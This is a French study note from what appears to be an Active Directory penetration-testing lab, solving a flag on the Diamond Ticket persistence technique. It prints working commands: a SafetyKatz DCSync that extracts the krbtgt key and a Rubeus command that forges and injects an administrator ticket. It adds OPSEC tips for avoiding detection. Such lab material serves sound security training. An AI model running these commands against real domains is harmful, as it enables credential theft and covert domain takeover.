---
flag: 19
machine: dcorp-dc
statut: à faire
technique: Diamond Ticket
LO: [[LO10 - Diamond ticket]]
---

# F19 · Compte source du Diamond Ticket

> [!summary] Objectif
> Identifier le compte dont la clé secrète est nécessaire pour signer le PAC d un Diamond Ticket.

## Contexte
- **Etape attack flow** : persistence Kerberos post-DA — variante furtive du Golden Ticket (le TGT sous-jacent est authentique, seul le PAC est re-signé).
- **Ce qu on a** : privilèges DA, une session de domaine valide (permet `/tgtdeleg`), clé AES256 du compte cible.
- **Ce qu on cherche** : le nom du compte dont la clé signe le PAC → même compte que celui utilisé pour Golden.

## Solution

### Etape 1 — Extraire la clé AES256 du compte cible via DCSync
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
→ Voir [[Cheatsheet - Persistence]] (DCSync).

### Etape 2 — Forger le Diamond Ticket
Le compte source est **`krbtgt`** — c est sa clé AES qui signe le PAC re-forgé (comme pour Golden), la différence étant que le TGT de base est un vrai TGT obtenu via `/tgtdeleg`.
```powershell
Rubeus.exe diamond /krbkey:<A REMPLIR DEPUIS LAB> /tgtdeleg /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
→ Voir [[Cheatsheet - Tickets Kerberos]] — section Diamond.

### Etape 3 — Vérifier / réutiliser
```powershell
klist
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

## Reponse

| Element | Valeur |
|---------|--------|
| Compte dont la clé signe le PAC du Diamond Ticket | **krbtgt** |
| Clé AES256 de `krbtgt` (dcorp) | <A REMPLIR DEPUIS LAB> |

## Pieges et OPSEC
- Diamond ≠ Golden par la méthode, mais **même prérequis** : clé `krbtgt`. Un double reset de `krbtgt` invalide les deux.
- `/tgtdeleg` s appuie sur le contexte Kerberos courant → il faut une session domaine capable de demander un vrai TGT (Golden n en a pas besoin).
- Plus furtif que Golden car un vrai TGT existe côté KDC (pas de ticket 100 % forgé from-scratch qui trahit par sa durée de vie anormale).
- Forcer `/enctype:aes`, éviter RC4 (event **4769** avec type de chiffrement anormal).

## Refs
- [[Cheatsheet - Tickets Kerberos]]
- [[Cheatsheet - Persistence]]
- [[Synthèse - Kerberos]]
- [[LO10 - Diamond ticket]]

[[Flags - Index]] · [[Journal - Index]]
